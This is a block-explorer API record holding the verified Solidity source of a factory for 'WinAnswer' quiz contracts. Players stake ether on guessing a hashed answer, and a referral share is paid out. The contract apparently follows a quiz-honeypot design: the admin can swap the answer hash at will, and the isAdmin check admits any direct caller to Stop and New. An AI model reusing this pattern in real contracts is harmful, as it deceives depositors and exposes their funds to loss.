{"status": "1", "message": "OK", "result": [{"SourceCode": "{\"ContractsFactory.sol\":{\"content\":\"import \\\"./WinAnswer.sol\\\";\\npragma solidity 0.8.11;\\n\\ncontract ContractsFactory {\\n    string name;\\n    Referrals referralsList;\\n    address factory;\\n\\n    constructor(){\\n        factory = msg.sender;\\n    }\\n\\n    function create() public returns(address) {\\n        WinAnswer winAnswer = new WinAnswer();\\n        referralsList.addReferralOnNewContractCreation(address(winAnswer));\\n        return address(winAnswer);\\n    }\\n\\n    function setReferrals(address _referrals) public {\\n        require(msg.sender == factory);\\n        referralsList = Referrals(_referrals);\\n    }\\n\\n    function referrals() public view returns(address){\\n        return address(referralsList);\\n    }\\n}\\n\"},\"WinAnswer.sol\":{\"content\":\"import \\\"./ContractsFactory.sol\\\";\\npragma solidity 0.8.11;\\n\\ncontract WinAnswer\\n{\\n    string name;\\n    string public question;\\n\\n    function Try(string memory _response) public payable\\n    {\\n        require(msg.sender == tx.origin);\\n\\n        if(responseHash == keccak256(abi.encode(_response)) \\u0026\\u0026 msg.value \\u003e 1 ether)\\n        {\\n            payable(msg.sender).transfer(address(this).balance);\\n        }\\n        cumulated = cumulated + msg.value;\\n        referrals.log(\\\"Try\\\");\\n    }\\n\\n    function Start(string calldata _question, string calldata _response) public payable isAdmin {\\n        responseHash = keccak256(abi.encode(_response));\\n        question = _question;\\n    }\\n\\n    uint cumulated;\\n    address admin;\\n    bytes32 responseHash;\\n    Referrals referrals;\\n    address referral;\\n    bool referralTookGain;\\n\\n    function balanceOf() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n\\n    function Stop() public payable isAdmin {\\n        require(address(this).balance \\u003e 0);\\n        if(referral != address(0)){\\n            payable(msg.sender).transfer(address(this).balance);\\n        }else{\\n            uint amount = address(this).balance - cumulated * 5 / 100;\\n            payable(msg.sender).transfer(amount);\\n        }\\n        referrals.log(\\\"Stop\\\");\\n    }\\n\\n    function SetReferral(address _referral) public isAdmin {\\n        require(referral == address(0));\\n        require(referral != address(this));\\n        referral = _referral;\\n    }\\n\\n    function WithdrawReferralGain() public payable {\\n        require(msg.sender == referral \\u0026\\u0026 !referralTookGain \\u0026\\u0026 referrals.referralExist(msg.sender));\\n        uint referralGain = cumulated * 5 / 100;\\n        referralTookGain = true;\\n        payable(referral).transfer(referralGain);\\n    }\\n\\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\\n        question = _question;\\n        responseHash = _responseHash;\\n    }\\n\\n    constructor() {\\n        admin = tx.origin;\\n        referrals = Referrals(ContractsFactory(msg.sender).referrals());\\n    }\\n\\n    modifier isAdmin(){\\n        require(admin == msg.sender || admin == tx.origin || tx.origin == msg.sender);\\n        _;\\n    }\\n\\n    fallback() external {}\\n}\\n\\n\\ncontract Referrals {\\n    string name;\\n    mapping (address=\\u003ebool) public referrals;\\n    event NewReferral(address indexed referral);\\n    event Log(address indexed, string message);\\n    address platform;\\n\\n    function log(string calldata message) public {\\n        emit Log(msg.sender, message);\\n    }\\n\\n    constructor(){\\n        platform = msg.sender;\\n    }\\n\\n    function addReferralOnNewContractCreation(address newReferral) public isPlatform {\\n        referrals[newReferral] = true;\\n        emit NewReferral(newReferral);\\n    }\\n\\n    modifier isPlatform(){\\n        require(msg.sender == platform);\\n        _;\\n    }\\n\\n    function setPlatform(address _platform) public {\\n        require(msg.sender == platform);\\n        platform = _platform;\\n    }\\n\\n    function referralExist(address referral) public view returns(bool){\\n        return referrals[referral];\\n    }\\n}\\n\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"create\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"referrals\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_referrals\",\"type\":\"address\"}],\"name\":\"setReferrals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ContractsFactory", "CompilerVersion": "v0.8.11+commit.d7f03943", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://75a1ff3fe2fc32a35a56346231756ddde5bc74da7586c738c60844fa42de3171"}]}